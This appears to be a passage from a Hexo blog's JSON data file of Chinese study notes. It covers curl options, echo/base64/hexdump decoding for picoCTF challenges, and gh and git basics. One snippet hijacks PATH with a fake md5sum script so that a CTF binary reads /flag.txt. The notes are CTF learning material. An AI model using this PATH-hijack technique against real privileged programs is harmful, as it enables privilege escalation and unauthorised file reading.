Proxy（注意是小寫）</td>\n</tr>\n<tr>\n<td><code>--max-time</code></td>\n<td>最長請求時間（秒）</td>\n</tr>\n<tr>\n<td><code>--trace</code></td>\n<td>輸出詳細除錯 trace 到檔案</td>\n</tr>\n<tr>\n<td><code>-X DELETE</code></td>\n<td>指定 HTTP 方法為 <code>DELETE</code>，用於刪除資源</td>\n</tr>\n<tr>\n<td><code>-k </code></td>\n<td>忽略 SSL 憑證錯誤</td>\n</tr>\n<tr>\n<td><code>--cert cert.pem --key key.pem</code></td>\n<td>使用客戶端憑證連線</td>\n</tr>\n</tbody></table>\n","excerpt":"","more":"<p>curl 發送https請求<br>-O是下載</p>\n<pre><code>curl -O -X &#39;GET&#39; \\\n&#39;http://verbal-sleep.picoctf.net:49884/heapdump&#39; \\\n-H &#39;accept: */*&#39;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>參數</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-X</code></td>\n<td>指定 HTTP 方法（如 <code>GET</code>、<code>POST</code>、<code>PUT</code>）</td>\n</tr>\n<tr>\n<td><code>-o [檔名]</code></td>\n<td>將下載內容儲存為指定檔案</td>\n</tr>\n<tr>\n<td><code>-O</code></td>\n<td>以原始檔名儲存下載內容</td>\n</tr>\n<tr>\n<td><code>-d</code></td>\n<td>傳送 POST&#x2F;PUT 表單資料（<code>key=value</code>）</td>\n</tr>\n<tr>\n<td><code>-H</code></td>\n<td>加入自訂 HTTP 標頭（Header）</td>\n</tr>\n<tr>\n<td><code>-u</code></td>\n<td>HTTP Basic 認證（<code>user:pass</code>）</td>\n</tr>\n<tr>\n<td><code>-F</code></td>\n<td>表單格式上傳檔案（<code>-F &quot;file=@檔案&quot;</code>）</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>顯示詳細傳輸過程（verbose 模式）</td>\n</tr>\n<tr>\n<td><code>-k</code></td>\n<td>忽略 HTTPS 憑證錯誤</td>\n</tr>\n<tr>\n<td><code>-I</code></td>\n<td>只抓 HTTP Response Header</td>\n</tr>\n<tr>\n<td><code>-L</code></td>\n<td>自動跟隨 HTTP 轉址（redirect）</td>\n</tr>\n<tr>\n<td><code>-b</code></td>\n<td>傳送 Cookie（可接字串或 cookie 檔）</td>\n</tr>\n<tr>\n<td><code>-c</code></td>\n<td>將 Cookie 儲存至檔案</td>\n</tr>\n<tr>\n<td><code>--cookie</code></td>\n<td>同 <code>-b</code>，傳送 cookie 字串</td>\n</tr>\n<tr>\n<td><code>--resolve</code></td>\n<td>自訂 DNS 解析（格式：<code>host:port:IP</code>）</td>\n</tr>\n<tr>\n<td><code>--limit-rate</code></td>\n<td>限制傳輸速率（如：<code>100k</code>、<code>1m</code>）</td>\n</tr>\n<tr>\n<td><code>--retry</code></td>\n<td>請求失敗時自動重試次數</td>\n</tr>\n<tr>\n<td><code>--socks5</code></td>\n<td>使用 SOCKS5 Proxy</td>\n</tr>\n<tr>\n<td><code>-x</code></td>\n<td>使用 HTTP Proxy（注意是小寫）</td>\n</tr>\n<tr>\n<td><code>--max-time</code></td>\n<td>最長請求時間（秒）</td>\n</tr>\n<tr>\n<td><code>--trace</code></td>\n<td>輸出詳細除錯 trace 到檔案</td>\n</tr>\n<tr>\n<td><code>-X DELETE</code></td>\n<td>指定 HTTP 方法為 <code>DELETE</code>，用於刪除資源</td>\n</tr>\n<tr>\n<td><code>-k </code></td>\n<td>忽略 SSL 憑證錯誤</td>\n</tr>\n<tr>\n<td><code>--cert cert.pem --key key.pem</code></td>\n<td>使用客戶端憑證連線</td>\n</tr>\n</tbody></table>\n"},{"title":"學習","_content":"\nhex+ASCII模式 正常順序  且-n = 有沒有換行符號\n\n    echo -n \"cat /flag.txt\" | hexdump -C\n    \n \n這裡是以 2 bytes（16 位元）一組來顯示，每組是 4 個十六進位數字 16-bit Word 模式\n\n    echo -n \"cat /flag.txt\" | hexdump\n    \n\n這是 轉換ROT13\n\n    echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_uJdSftmh}\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n這是轉成base64\n\n    echo -n \"cat /flag.txt\" | base64\n    \n\n這是 將input轉換成echo \"$input\" | base64 -d 解密 連續6次 最終echo打印出input\n\n    input=\"VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh\n    RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk\n    MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW\n    VkpEVGxaYVdFMVhSbFZrTTBKeldWaHdRMDB4V2tWU2JFNVdDbUpXV2tkVU1WcFhWVzFHZEdWRlZs\n    aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==\"\n\n    for i in {1..6}; do\n    input=$(echo \"$input\" | base64 -d)\n    done\n\n    echo \"$input\"\n\n\n這是透過bc將 56這個10進制值  轉換成 2進制   bc執行\"obase=2; 56\"\n\n    echo \"obase=2; 56\" | bc\n\n\nbase64加上-d是base64解密  不加則是加密\n\n    echo \"cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg==\" | base64 -d\n\n這是 輸出這 4 個 ASCII 字元  e模式是可輸入  控制字符 \\n 執行換行  一般來說是打印\n\n    echo -e \"\\x34\\x65\\x63\\x39\"\n\n| 控制字元| 意義            |\n| ------ | --------------- |\n| \\n     | 換行            |\n| \\t     | tab             |\n| \\r     | carriage return |\n| \\xHH   | 十六進位字元     |\n| \\\\     | 字元 \"\"         |\n\n\n\n先將val賦予成 執行完base64 -d 的內容  在sed -E 的清理提取 完後 最後 解密後打印出來\n\n    val=$(echo \"YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==\" | base64 -d)\n    clean=$(echo \"$val\" | sed -E \"s/^b'(.*)'$/\\1/\")\n    echo \"$clean\" | base64 -d\n\n|命令表| 意義|\n| ------ | --------------- |\n|s/  | 要找的模式/要取代成的東西/|\n|^\t| 開頭（字串開頭必須是）|\n|b'\t| 字面上的 b'|\n|(.*)| 括號代表群組，把中間所有字元抓出來|\n|'\t| 字面上的結尾單引號|\n|$\t| 表示一定要在整行的結尾|\n|\\1\t| 表示替換成剛才 (.*) 群組裡面抓到的內容|\n\nxxd -p是將輸入內容轉為「純十六進位格式（plain hexdump）」，不帶位址、ASCII 解釋等欄位\n    echo -n \"ioplm\" | xxd -p\n\n\nod -An -tx1 使用 od（octal dump）工具： -An 表示不印出位址欄位 -tx1 表示以十六進位格式，每個位元組一組輸出\ntr -d ' \\n'把 od 輸出的空格和換行全部移除，只留下純 hex 字元\n    echo -n \"ioplm\" | od -An -tx1\n    echo -n \"ioplm\" | od -An -tx1 | tr -d ' \\n'\n\n這個xxd -p =先轉換  sed 每2個字元+空白   awk轉換 NF是欄數位 由後往前讀每個欄位，逆序輸出\n    echo -n \"ioplm\" | xxd -p | sed 's/../& /g' | awk '{ for(i=NF;i>0;i--) printf $i }'\n\n\n寫入目標檔案 md5sum 建立一個假的 md5sum 腳本  \nchmod +x md5sum設為可執行檔\n將當前目錄放進 PATH 開頭\n\n    echo -e '#!/bin/bash\\ncat \"$@\"\\n/bin/md5sum\"$@\"' > md5sum\n    chmod +x md5sum\n    PATH=.:$PATH ./flaghasher\n\n\n把當前目錄 . 放到環境變數 PATH 的最前面\n    export PATH=.:$PATH","source":"_posts/echo基礎.md","raw":"---\ntitle: 學習\ncategories:\n  - linux\n---\n\nhex+ASCII模式 正常順序  且-n = 有沒有換行符號\n\n    echo -n \"cat /flag.txt\" | hexdump -C\n    \n \n這裡是以 2 bytes（16 位元）一組來顯示，每組是 4 個十六進位數字 16-bit Word 模式\n\n    echo -n \"cat /flag.txt\" | hexdump\n    \n\n這是 轉換ROT13\n\n    echo \"cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_uJdSftmh}\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n這是轉成base64\n\n    echo -n \"cat /flag.txt\" | base64\n    \n\n這是 將input轉換成echo \"$input\" | base64 -d 解密 連續6次 最終echo打印出input\n\n    input=\"VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh\n    RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk\n    MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW\n    VkpEVGxaYVdFMVhSbFZrTTBKeldWaHdRMDB4V2tWU2JFNVdDbUpXV2tkVU1WcFhWVzFHZEdWRlZs\n    aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==\"\n\n    for i in {1..6}; do\n    input=$(echo \"$input\" | base64 -d)\n    done\n\n    echo \"$input\"\n\n\n這是透過bc將 56這個10進制值  轉換成 2進制   bc執行\"obase=2; 56\"\n\n    echo \"obase=2; 56\" | bc\n\n\nbase64加上-d是base64解密  不加則是加密\n\n    echo \"cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg==\" | base64 -d\n\n這是 輸出這 4 個 ASCII 字元  e模式是可輸入  控制字符 \\n 執行換行  一般來說是打印\n\n    echo -e \"\\x34\\x65\\x63\\x39\"\n\n| 控制字元| 意義            |\n| ------ | --------------- |\n| \\n     | 換行            |\n| \\t     | tab             |\n| \\r     | carriage return |\n| \\xHH   | 十六進位字元     |\n| \\\\     | 字元 \"\"         |\n\n\n\n先將val賦予成 執行完base64 -d 的內容  在sed -E 的清理提取 完後 最後 解密後打印出來\n\n    val=$(echo \"YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==\" | base64 -d)\n    clean=$(echo \"$val\" | sed -E \"s/^b'(.*)'$/\\1/\")\n    echo \"$clean\" | base64 -d\n\n|命令表| 意義|\n| ------ | --------------- |\n|s/  | 要找的模式/要取代成的東西/|\n|^\t| 開頭（字串開頭必須是）|\n|b'\t| 字面上的 b'|\n|(.*)| 括號代表群組，把中間所有字元抓出來|\n|'\t| 字面上的結尾單引號|\n|$\t| 表示一定要在整行的結尾|\n|\\1\t| 表示替換成剛才 (.*) 群組裡面抓到的內容|\n\nxxd -p是將輸入內容轉為「純十六進位格式（plain hexdump）」，不帶位址、ASCII 解釋等欄位\n    echo -n \"ioplm\" | xxd -p\n\n\nod -An -tx1 使用 od（octal dump）工具： -An 表示不印出位址欄位 -tx1 表示以十六進位格式，每個位元組一組輸出\ntr -d ' \\n'把 od 輸出的空格和換行全部移除，只留下純 hex 字元\n    echo -n \"ioplm\" | od -An -tx1\n    echo -n \"ioplm\" | od -An -tx1 | tr -d ' \\n'\n\n這個xxd -p =先轉換  sed 每2個字元+空白   awk轉換 NF是欄數位 由後往前讀每個欄位，逆序輸出\n    echo -n \"ioplm\" | xxd -p | sed 's/../& /g' | awk '{ for(i=NF;i>0;i--) printf $i }'\n\n\n寫入目標檔案 md5sum 建立一個假的 md5sum 腳本  \nchmod +x md5sum設為可執行檔\n將當前目錄放進 PATH 開頭\n\n    echo -e '#!/bin/bash\\ncat \"$@\"\\n/bin/md5sum\"$@\"' > md5sum\n    chmod +x md5sum\n    PATH=.:$PATH ./flaghasher\n\n\n把當前目錄 . 放到環境變數 PATH 的最前面\n    export PATH=.:$PATH","slug":"echo基礎","published":1,"date":"2025-05-27T05:50:46.855Z","updated":"2025-06-01T17:22:34.612Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa9000kzrlretd67din","content":"<p>hex+ASCII模式 正常順序  且-n &#x3D; 有沒有換行符號</p>\n<pre><code>echo -n &quot;cat /flag.txt&quot; | hexdump -C\n</code></pre>\n<p>這裡是以 2 bytes（16 位元）一組來顯示，每組是 4 個十六進位數字 16-bit Word 模式</p>\n<pre><code>echo -n &quot;cat /flag.txt&quot; | hexdump\n</code></pre>\n<p>這是 轉換ROT13</p>\n<pre><code>echo &quot;cvpbPGS&#123;arkg_gvzr_V&#39;yy_gel_2_ebhaqf_bs_ebg13_uJdSftmh&#125;&quot; | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;\n</code></pre>\n<p>這是轉成base64</p>\n<pre><code>echo -n &quot;cat /flag.txt&quot; | base64\n</code></pre>\n<p>這是 將input轉換成echo “$input” | base64 -d 解密 連續6次 最終echo打印出input</p>\n<pre><code>input=&quot;VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh\nRmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk\nMlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW\nVkpEVGxaYVdFMVhSbFZrTTBKeldWaHdRMDB4V2tWU2JFNVdDbUpXV2tkVU1WcFhWVzFHZEdWRlZs\naGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==&quot;\n\nfor i in &#123;1..6&#125;; do\ninput=$(echo &quot;$input&quot; | base64 -d)\ndone\n\necho &quot;$input&quot;\n</code></pre>\n<p>這是透過bc將 56這個10進制值  轉換成 2進制   bc執行”obase&#x3D;2; 56”</p>\n<pre><code>echo &quot;obase=2; 56&quot; | bc\n</code></pre>\n<p>base64加上-d是base64解密  不加則是加密</p>\n<pre><code>echo &quot;cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg==&quot; | base64 -d\n</code></pre>\n<p>這是 輸出這 4 個 ASCII 字元  e模式是可輸入  控制字符 \\n 執行換行  一般來說是打印</p>\n<pre><code>echo -e &quot;\\x34\\x65\\x63\\x39&quot;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>控制字元</th>\n<th>意義</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>\\n</td>\n<td>換行</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>tab</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>carriage return</td>\n</tr>\n<tr>\n<td>\\xHH</td>\n<td>十六進位字元</td>\n</tr>\n<tr>\n<td>\\</td>\n<td>字元 “”</td>\n</tr>\n</tbody></table>\n<p>先將val賦予成 執行完base64 -d 的內容  在sed -E 的清理提取 完後 最後 解密後打印出來</p>\n<pre><code>val=$(echo &quot;YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==&quot; | base64 -d)\nclean=$(echo &quot;$val&quot; | sed -E &quot;s/^b&#39;(.*)&#39;$/\\1/&quot;)\necho &quot;$clean&quot; | base64 -d\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>命令表</th>\n<th>意義</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>s&#x2F;</td>\n<td>要找的模式&#x2F;要取代成的東西&#x2F;</td>\n</tr>\n<tr>\n<td>^</td>\n<td>開頭（字串開頭必須是）</td>\n</tr>\n<tr>\n<td>b’</td>\n<td>字面上的 b’</td>\n</tr>\n<tr>\n<td>(.*)</td>\n<td>括號代表群組，把中間所有字元抓出來</td>\n</tr>\n<tr>\n<td>‘</td>\n<td>字面上的結尾單引號</td>\n</tr>\n<tr>\n<td>$</td>\n<td>表示一定要在整行的結尾</td>\n</tr>\n<tr>\n<td>\\1</td>\n<td>表示替換成剛才 (.*) 群組裡面抓到的內容</td>\n</tr>\n</tbody></table>\n<p>xxd -p是將輸入內容轉為「純十六進位格式（plain hexdump）」，不帶位址、ASCII 解釋等欄位<br>    echo -n “ioplm” | xxd -p</p>\n<p>od -An -tx1 使用 od（octal dump）工具： -An 表示不印出位址欄位 -tx1 表示以十六進位格式，每個位元組一組輸出<br>tr -d ‘ \\n’把 od 輸出的空格和換行全部移除，只留下純 hex 字元<br>    echo -n “ioplm” | od -An -tx1<br>    echo -n “ioplm” | od -An -tx1 | tr -d ‘ \\n’</p>\n<p>這個xxd -p &#x3D;先轉換  sed 每2個字元+空白   awk轉換 NF是欄數位 由後往前讀每個欄位，逆序輸出<br>    echo -n “ioplm” | xxd -p | sed ‘s&#x2F;..&#x2F;&amp; &#x2F;g’ | awk ‘{ for(i&#x3D;NF;i&gt;0;i–) printf $i }’</p>\n<p>寫入目標檔案 md5sum 建立一個假的 md5sum 腳本<br>chmod +x md5sum設為可執行檔<br>將當前目錄放進 PATH 開頭</p>\n<pre><code>echo -e &#39;#!/bin/bash\\ncat &quot;$@&quot;\\n/bin/md5sum&quot;$@&quot;&#39; &gt; md5sum\nchmod +x md5sum\nPATH=.:$PATH ./flaghasher\n</code></pre>\n<p>把當前目錄 . 放到環境變數 PATH 的最前面<br>    export PATH&#x3D;.:$PATH</p>\n","excerpt":"","more":"<p>hex+ASCII模式 正常順序  且-n &#x3D; 有沒有換行符號</p>\n<pre><code>echo -n &quot;cat /flag.txt&quot; | hexdump -C\n</code></pre>\n<p>這裡是以 2 bytes（16 位元）一組來顯示，每組是 4 個十六進位數字 16-bit Word 模式</p>\n<pre><code>echo -n &quot;cat /flag.txt&quot; | hexdump\n</code></pre>\n<p>這是 轉換ROT13</p>\n<pre><code>echo &quot;cvpbPGS&#123;arkg_gvzr_V&#39;yy_gel_2_ebhaqf_bs_ebg13_uJdSftmh&#125;&quot; | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;\n</code></pre>\n<p>這是轉成base64</p>\n<pre><code>echo -n &quot;cat /flag.txt&quot; | base64\n</code></pre>\n<p>這是 將input轉換成echo “$input” | base64 -d 解密 連續6次 最終echo打印出input</p>\n<pre><code>input=&quot;VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh\nRmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk\nMlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW\nVkpEVGxaYVdFMVhSbFZrTTBKeldWaHdRMDB4V2tWU2JFNVdDbUpXV2tkVU1WcFhWVzFHZEdWRlZs\naGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==&quot;\n\nfor i in &#123;1..6&#125;; do\ninput=$(echo &quot;$input&quot; | base64 -d)\ndone\n\necho &quot;$input&quot;\n</code></pre>\n<p>這是透過bc將 56這個10進制值  轉換成 2進制   bc執行”obase&#x3D;2; 56”</p>\n<pre><code>echo &quot;obase=2; 56&quot; | bc\n</code></pre>\n<p>base64加上-d是base64解密  不加則是加密</p>\n<pre><code>echo &quot;cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg==&quot; | base64 -d\n</code></pre>\n<p>這是 輸出這 4 個 ASCII 字元  e模式是可輸入  控制字符 \\n 執行換行  一般來說是打印</p>\n<pre><code>echo -e &quot;\\x34\\x65\\x63\\x39&quot;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>控制字元</th>\n<th>意義</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>\\n</td>\n<td>換行</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>tab</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>carriage return</td>\n</tr>\n<tr>\n<td>\\xHH</td>\n<td>十六進位字元</td>\n</tr>\n<tr>\n<td>\\</td>\n<td>字元 “”</td>\n</tr>\n</tbody></table>\n<p>先將val賦予成 執行完base64 -d 的內容  在sed -E 的清理提取 完後 最後 解密後打印出來</p>\n<pre><code>val=$(echo &quot;YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==&quot; | base64 -d)\nclean=$(echo &quot;$val&quot; | sed -E &quot;s/^b&#39;(.*)&#39;$/\\1/&quot;)\necho &quot;$clean&quot; | base64 -d\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>命令表</th>\n<th>意義</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>s&#x2F;</td>\n<td>要找的模式&#x2F;要取代成的東西&#x2F;</td>\n</tr>\n<tr>\n<td>^</td>\n<td>開頭（字串開頭必須是）</td>\n</tr>\n<tr>\n<td>b’</td>\n<td>字面上的 b’</td>\n</tr>\n<tr>\n<td>(.*)</td>\n<td>括號代表群組，把中間所有字元抓出來</td>\n</tr>\n<tr>\n<td>‘</td>\n<td>字面上的結尾單引號</td>\n</tr>\n<tr>\n<td>$</td>\n<td>表示一定要在整行的結尾</td>\n</tr>\n<tr>\n<td>\\1</td>\n<td>表示替換成剛才 (.*) 群組裡面抓到的內容</td>\n</tr>\n</tbody></table>\n<p>xxd -p是將輸入內容轉為「純十六進位格式（plain hexdump）」，不帶位址、ASCII 解釋等欄位<br>    echo -n “ioplm” | xxd -p</p>\n<p>od -An -tx1 使用 od（octal dump）工具： -An 表示不印出位址欄位 -tx1 表示以十六進位格式，每個位元組一組輸出<br>tr -d ‘ \\n’把 od 輸出的空格和換行全部移除，只留下純 hex 字元<br>    echo -n “ioplm” | od -An -tx1<br>    echo -n “ioplm” | od -An -tx1 | tr -d ‘ \\n’</p>\n<p>這個xxd -p &#x3D;先轉換  sed 每2個字元+空白   awk轉換 NF是欄數位 由後往前讀每個欄位，逆序輸出<br>    echo -n “ioplm” | xxd -p | sed ‘s&#x2F;..&#x2F;&amp; &#x2F;g’ | awk ‘{ for(i&#x3D;NF;i&gt;0;i–) printf $i }’</p>\n<p>寫入目標檔案 md5sum 建立一個假的 md5sum 腳本<br>chmod +x md5sum設為可執行檔<br>將當前目錄放進 PATH 開頭</p>\n<pre><code>echo -e &#39;#!/bin/bash\\ncat &quot;$@&quot;\\n/bin/md5sum&quot;$@&quot;&#39; &gt; md5sum\nchmod +x md5sum\nPATH=.:$PATH ./flaghasher\n</code></pre>\n<p>把當前目錄 . 放到環境變數 PATH 的最前面<br>    export PATH&#x3D;.:$PATH</p>\n"},{"title":"gh基礎","date":"2025-05-31T11:56:19.000Z","_content":"改成main\n\n    gh api \\\n    -X PATCH \\\n    -H \"Accept: application/vnd.github+json\" \\\n    /repos/itamiokanjiro/itamiokanjiro.github.io \\\n    -f default_branch=main\n\n22\n\n\n    curl -X PATCH \\\n    -H \"Authorization: token 我的token\" \\\n    -H \"Accept: application/vnd.github+json\" \\\n    https://api.github.com/repos/itamiokanjiro/itamiokanjiro.github.io \\\n    -d '{\"default_branch\":\"main\"}'\n\ngh登入 創建itamiokanjiro.github.io\n\n   gh auth login\n   gh repo create test.github.io --public --confirm\n\ngh登出\n\n    gh auth logout\n\n強制設定看main\n\n    gh api -X POST /repos/itamiokanjiro/test.github.io/pages \\\n    -f source.branch='main' \\\n    -f source.path='/'\n\n\n刪除\n\n   gh repo delete itamiokanjiro/test.github.io\n\n\n\n\n\nGitHub.com -> SSH -> Yes -> 密碼 -> Paste an authentication token ->\n\n","source":"_posts/gh基礎.md","raw":"---\ntitle: gh基礎\ndate: 2025-05-31 19:56:19\ntags:\n---\n改成main\n\n    gh api \\\n    -X PATCH \\\n    -H \"Accept: application/vnd.github+json\" \\\n    /repos/itamiokanjiro/itamiokanjiro.github.io \\\n    -f default_branch=main\n\n22\n\n\n    curl -X PATCH \\\n    -H \"Authorization: token 我的token\" \\\n    -H \"Accept: application/vnd.github+json\" \\\n    https://api.github.com/repos/itamiokanjiro/itamiokanjiro.github.io \\\n    -d '{\"default_branch\":\"main\"}'\n\ngh登入 創建itamiokanjiro.github.io\n\n   gh auth login\n   gh repo create test.github.io --public --confirm\n\ngh登出\n\n    gh auth logout\n\n強制設定看main\n\n    gh api -X POST /repos/itamiokanjiro/test.github.io/pages \\\n    -f source.branch='main' \\\n    -f source.path='/'\n\n\n刪除\n\n   gh repo delete itamiokanjiro/test.github.io\n\n\n\n\n\nGitHub.com -> SSH -> Yes -> 密碼 -> Paste an authentication token ->\n\n","slug":"gh基礎","published":1,"updated":"2025-06-01T11:56:30.178Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa9000lzrlr4xtjgmhe","content":"<p>改成main</p>\n<pre><code>gh api \\\n-X PATCH \\\n-H &quot;Accept: application/vnd.github+json&quot; \\\n/repos/itamiokanjiro/itamiokanjiro.github.io \\\n-f default_branch=main\n</code></pre>\n<p>22</p>\n<pre><code>curl -X PATCH \\\n-H &quot;Authorization: token 我的token&quot; \\\n-H &quot;Accept: application/vnd.github+json&quot; \\\nhttps://api.github.com/repos/itamiokanjiro/itamiokanjiro.github.io \\\n-d &#39;&#123;&quot;default_branch&quot;:&quot;main&quot;&#125;&#39;\n</code></pre>\n<p>gh登入 創建itamiokanjiro.github.io</p>\n<p>   gh auth login<br>   gh repo create test.github.io –public –confirm</p>\n<p>gh登出</p>\n<pre><code>gh auth logout\n</code></pre>\n<p>強制設定看main</p>\n<pre><code>gh api -X POST /repos/itamiokanjiro/test.github.io/pages \\\n-f source.branch=&#39;main&#39; \\\n-f source.path=&#39;/&#39;\n</code></pre>\n<p>刪除</p>\n<p>   gh repo delete itamiokanjiro&#x2F;test.github.io</p>\n<p>GitHub.com -&gt; SSH -&gt; Yes -&gt; 密碼 -&gt; Paste an authentication token -&gt;</p>\n","excerpt":"","more":"<p>改成main</p>\n<pre><code>gh api \\\n-X PATCH \\\n-H &quot;Accept: application/vnd.github+json&quot; \\\n/repos/itamiokanjiro/itamiokanjiro.github.io \\\n-f default_branch=main\n</code></pre>\n<p>22</p>\n<pre><code>curl -X PATCH \\\n-H &quot;Authorization: token 我的token&quot; \\\n-H &quot;Accept: application/vnd.github+json&quot; \\\nhttps://api.github.com/repos/itamiokanjiro/itamiokanjiro.github.io \\\n-d &#39;&#123;&quot;default_branch&quot;:&quot;main&quot;&#125;&#39;\n</code></pre>\n<p>gh登入 創建itamiokanjiro.github.io</p>\n<p>   gh auth login<br>   gh repo create test.github.io –public –confirm</p>\n<p>gh登出</p>\n<pre><code>gh auth logout\n</code></pre>\n<p>強制設定看main</p>\n<pre><code>gh api -X POST /repos/itamiokanjiro/test.github.io/pages \\\n-f source.branch=&#39;main&#39; \\\n-f source.path=&#39;/&#39;\n</code></pre>\n<p>刪除</p>\n<p>   gh repo delete itamiokanjiro&#x2F;test.github.io</p>\n<p>GitHub.com -&gt; SSH -&gt; Yes -&gt; 密碼 -&gt; Paste an authentication token -&gt;</p>\n"},{"title":"git基礎","date":"2025-05-30T13:40:55.000Z","_content":"git clone 下載目標檔案\n\n    git clone https://github.com/D-Sketon/hexo-theme-reimu.git\n    git clone https://github.com/D-Sketon/reimu-template\n    \n查看歷史\n\n    git log \n    git log --perl-regexp --author='^(?!picoCTF <ops@picoctf\\.com>).*$'\n\n切換到 \n\n    git switch --detach b562f0b425907789d11d2fe2793e67592dc6be93\n    git switch master\n    git switch feature/part-1\n\n\n顯示分支\n\n    git branch\n\n\ngit教學\n\n    git remote remove origin\n    git remote add origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\n    git remote set-url origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\n\n\n產生金鑰\n\n\n    ssh-keygen -t rsa -b 4096 -C \"a234123234a@gmail.com\"\n    cat ~/.ssh/id_rsa.pub\n\n\n\n    ssh-keygen -t ed25519 -C \"a234123234a@gmail.com\"\n    cat ~/.ssh/id_ed25519.pub\n\n\n設定作者\n\n    git config user.name \"你的 GitHub 使用者名稱\"\n\n設定信箱\n\n    git config user.email \"你的 GitHub 郵箱\"\n\n查看修改 狀況\n\n    git status   \n\n\n刪除跟蹤\n\n    git rm -r --cached 跟CTF無關/\n\n\n\n推送遠端\n\n    git push -u origin main\n\n\n更新用\n\n    git commit -m \"更新\"\n\n\n測試連接\n\n    ssh -T git@github.com\n","source":"_posts/git基礎.md","raw":"---\ntitle: git基礎\ndate: 2025-05-30 21:40:55\ntags:\n---\ngit clone 下載目標檔案\n\n    git clone https://github.com/D-Sketon/hexo-theme-reimu.git\n    git clone https://github.com/D-Sketon/reimu-template\n    \n查看歷史\n\n    git log \n    git log --perl-regexp --author='^(?!picoCTF <ops@picoctf\\.com>).*$'\n\n切換到 \n\n    git switch --detach b562f0b425907789d11d2fe2793e67592dc6be93\n    git switch master\n    git switch feature/part-1\n\n\n顯示分支\n\n    git branch\n\n\ngit教學\n\n    git remote remove origin\n    git remote add origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\n    git remote set-url origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\n\n\n產生金鑰\n\n\n    ssh-keygen -t rsa -b 4096 -C \"a234123234a@gmail.com\"\n    cat ~/.ssh/id_rsa.pub\n\n\n\n    ssh-keygen -t ed25519 -C \"a234123234a@gmail.com\"\n    cat ~/.ssh/id_ed25519.pub\n\n\n設定作者\n\n    git config user.name \"你的 GitHub 使用者名稱\"\n\n設定信箱\n\n    git config user.email \"你的 GitHub 郵箱\"\n\n查看修改 狀況\n\n    git status   \n\n\n刪除跟蹤\n\n    git rm -r --cached 跟CTF無關/\n\n\n\n推送遠端\n\n    git push -u origin main\n\n\n更新用\n\n    git commit -m \"更新\"\n\n\n測試連接\n\n    ssh -T 